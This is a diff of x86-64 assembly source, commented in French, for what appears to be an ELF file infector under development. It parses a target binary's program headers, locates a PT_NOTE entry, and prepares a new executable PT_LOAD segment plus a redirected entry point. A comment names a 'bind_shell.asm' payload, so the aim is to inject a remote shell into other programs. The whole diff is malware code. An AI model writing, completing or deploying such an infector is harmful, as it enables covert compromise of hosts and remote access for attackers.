@@ -24,6 +24,19 @@ section .bss
 
 	espace_disponible resq 1
 
+	new_e_entry resq 1
+
+	new_p_type resd 1
+	new_p_flags resd 1
+	new_p_offset resq 1
+	new_p_vaddr resq 1
+	new_p_paddr resq 1
+	new_p_filesz resq 1
+	new_p_memsz resq 1
+	new_p_align resq 1
+
+payload_size    resq 1
+
 section .text
 
 global _start
@@ -33,7 +46,7 @@ _start:
 	mov rdi, nomelf
 	mov rsi, 2
 	mov rdx, 0
-	syscall 	; ouvrir ELF en lecture écriture
+	syscall 	; Ouvrir ELF en lecture écriture
 
 	mov r8, rax
 
@@ -41,29 +54,29 @@ _start:
 	mov rdi, r8
 	mov rsi, elfheader
 	mov rdx, 64
-	syscall 	; lire ELF Header
+	syscall 	; Lire ELF Header
 
 	mov eax, [elfheader]
 	cmp eax, [vmagicnum]
-	jne erreur 	; vérifier magic
+	jne erreur 	; Vérifier magic
 
 	mov rax, [elfheader + 0x18]
-	mov [recup_e_entry], rax 	; récupérer e_entry
+	mov [recup_e_entry], rax 	; Récupérer e_entry
 
 	mov rax, [elfheader + 0x20]
-	mov [recup_e_phoff], rax 	; récupérer e_phoff
+	mov [recup_e_phoff], rax 	; Récupérer e_phoff
 
 	mov ax, [elfheader + 0x36]
-	mov [recup_e_phentsize], ax 	; récupérer e_phentsize
+	mov [recup_e_phentsize], ax 	; Récupérer e_phentsize
 
 	mov ax, [elfheader + 0x38]
-	mov [recup_phnum], ax 	; récupérer e_phnum
+	mov [recup_phnum], ax 	; Récupérer e_phnum
 
 	mov rax, 0
 	mov rdi, r8
 	mov rsi, elfdata
 	mov rdx, 4096
-	syscall 	; lire la suite du fichier
+	syscall 	; Lire la suite du fichier
 
 	mov rcx, 0 	; i = 0
 
@@ -81,7 +94,7 @@ boucle_proghead:
 
 	add rax, rdx 	; RAX = e_phoff + i * e_phentsize
 	sub rax, 64 	; elfdata commence à l'offset 64
-	mov edx, [elfdata + rax]	; récupérer p_type
+	mov edx, [elfdata + rax]	; Récupérer p_type
 
 	cmp edx, 4	; PT_NOTE = 4
 	je pt_note_trouve
@@ -96,9 +109,9 @@ boucle_proghead:
 pt_note_trouve:
 
 	cmp qword [pt_note_sav], 0	
-	jne suite_boucle			; empecher d'écraser si il existe déjà un PT_NOTE trouvé
+	jne suite_boucle			; Empecher d'écraser si il existe déjà un PT_NOTE trouvé
 
-	mov [pt_note_sav], rax		; sauvegarder le premier PT_NOTE
+	mov [pt_note_sav], rax		; Sauvegarder le premier PT_NOTE
 
 	jmp suite_boucle
 
@@ -127,17 +140,17 @@ pt_load_trouve:
 
 	mov rax, [p_memsz]
 	sub rax, [p_filesz]
-	mov [espace_disponible], rax	 ; espace mémoire potentiellement libre
+	mov [espace_disponible], rax	 ; Espace mémoire potentiellement libre
 
 	mov rax, [p_vaddr]
 	add rax, [p_filesz]
-	add rax, 0x1000			; prépare l'alignement
-	and rax, ~0xFFF			; alignement sur 0x1000
+	add rax, 0x1000			; Prépare l'alignement
+	and rax, ~0xFFF			; Alignement sur 0x1000
 
 	cmp rax, [last_load_end]
 	jle suite_boucle
 
-	mov [last_load_end], rax		; conserver la plus grande adresse
+	mov [last_load_end], rax		; Conserver la plus grande adresse
 
 	jmp suite_boucle
 
@@ -149,7 +162,7 @@ suite_boucle:
 
 
 fin_recherche:
-	mov r13, [last_load_end]        ; nouvelle adresse virtuelle
+	mov r13, [last_load_end]        ; Nouvelle adresse virtuelle
 	add r13, 0x1000
 	and r13, ~0xFFF
 
@@ -160,6 +173,33 @@ fin_recherche:
 	syscall 		; rechercher la fin du ELF
 
 	mov r12, rax		; r12 = offset de fin du fichier
+
+preparation_PT_LOAD:
+	mov dword [new_p_type], 1
+
+	mov dword [new_p_flags], 5
+
+	mov rax, r12
+	; add rax, 0xFFF ici
+	; and rax, ~0xFFF  ici
+	mov [new_p_offset], rax ; Peut etre alignement à respecter
+
+	mov [new_p_vaddr], r13
+
+	mov rax, [new_p_vaddr]
+	mov [new_p_paddr], rax
+
+	mov rax, [payload_size]		; A initialiser plus tard avec : stat -c %s bind_shell.asm
+	mov [new_p_filesz], rax
+
+	mov rax, [new_p_filesz]
+	mov [new_p_memsz], rax
+
+	mov rax, [p_align]		; A faire correspondre a l'alignement de simple plus tard
+	mov [new_p_align], rax
+
+	mov rax, [new_p_vaddr] ; Nouveau e_entry = new_e_entry / Ancien e_entry = recup_e_entry
+	mov [new_e_entry], rax
 
 	mov rax, 3
 	mov rdi, r8
